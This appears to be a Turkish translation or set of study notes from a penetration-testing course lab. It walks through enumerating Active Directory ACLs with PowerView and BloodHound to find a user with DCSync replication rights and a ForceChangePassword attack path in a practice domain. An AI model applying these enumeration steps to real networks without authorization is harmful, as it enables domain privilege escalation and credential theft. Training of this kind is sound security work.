Son olarak, `adunn` kullanıcısının hedefimize yaklaşmak için kullanabileceğimiz herhangi bir ilginç erişim türüne sahip olup olmadığına bakalım.


#### **İlginç Erişim Arayışı**

```powershell-session
PS C:\htb> $adunnsid = Convert-NameToSid adunn 
PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $adunnsid} -Verbose

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : DS-Replication-Get-Changes
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1164
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

<SNIP>
```

Yukarıdaki çıktı, `adunn` kullanıcımızın domain nesnesi üzerinde `DS-Replication-Get-Changes` ve `DS-Replication-Get-Changes-In-Filtered-Set` haklarına sahip olduğunu göstermektedir. Bu, bu kullanıcının bir DCSync saldırısı gerçekleştirmek için kullanılabileceği anlamına gelir. Bu saldırıyı `DCSync` bölümünde derinlemesine ele alacağız.


## **BloodHound ile ACL'leri Numaralandırma**
PowerView ve yerleşik PowerShell cmdlet'leri gibi daha manuel yöntemler kullanarak saldırı yolunu listelediğimize göre, son derece güçlü BloodHound aracını kullanarak bunun ne kadar kolay tespit edilebileceğine bakalım. SharpHound ingestor ile daha önce topladığımız verileri alalım ve BloodHound'a yükleyelim. Ardından, `wley` kullanıcısını başlangıç düğümümüz olarak ayarlayabilir, `Node Info` sekmesini seçebilir ve `Outbound Control Rights` seçeneğine `ilerleyebiliriz`. Bu seçenek bize doğrudan, grup üyeliği yoluyla kontrol ettiğimiz nesneleri ve kullanıcımızın `Transitive Object Control` altında ACL saldırı yolları yoluyla kontrol etmemize yol açabileceği nesnelerin sayısını gösterecektir. `First Degree Object Control`'ün yanındaki `1` 'e tıklarsak, `damundsen` kullanıcısı üzerinde `ForceChangePassword` olarak numaralandırdığımız ilk hakları görürüz.


#### **BloodHound aracılığıyla Node Bilgilerini Görüntüleme**
![Pasted image 20241022001109.png](/img/user/resimler/Pasted%20image%2020241022001109.png)

İki nesne arasındaki çizgiye sağ tıklarsak bir menü açılacaktır. `Help (Yardım`) seçeneğini seçersek, bu ACE'yi kötüye kullanma konusunda yardım alacağız:

- Bu saldırıyı gerçekleştirmek için kullanılabilecek belirli haklar, araçlar ve komutlar hakkında daha fazla bilgi  
- Operasyonel Güvenlik (Opsec) hususları  
- Dış referanslar.

Bu menüyü daha sonra daha detaylı inceleyeceğiz.


#### **ForceChangePassword'ü Daha Fazla Araştırma**
![Pasted image 20241022001154.png](/img/user/resimler/Pasted%20image%2020241022001154.png)

`Transitive Object Control`'ün yanındaki `16` 'ya tıklarsak, yukarıda özenle sıraladığımız tüm yolu göreceğiz. Buradan, her bir saldırıyı en iyi şekilde gerçekleştirmenin yollarını bulmak için her bir kenar için yardım menülerinden yararlanabiliriz.


#### **BloodHound aracılığıyla Potansiyel Saldırı Yollarını Görüntüleme**
![Pasted image 20241022001221.png](/img/user/resimler/Pasted%20image%2020241022001221.png)
Son olarak, `adunn` kullanıcısının DCSync haklarına sahip olduğunu doğrulamak için BloodHound'daki önceden oluşturulmuş sorguları kullanabiliriz.


#### **BloodHound aracılığıyla Build Öncesi sorguları görüntüleme**
![Pasted image 20241022001303.png](/img/user/resimler/Pasted%20image%2020241022001303.png)

Şimdi bu saldırı yollarını çeşitli şekillerde sıraladık. Bir sonraki adım bu saldırı zincirini baştan sona gerçekleştirmek olacak. Hadi başlayalım!
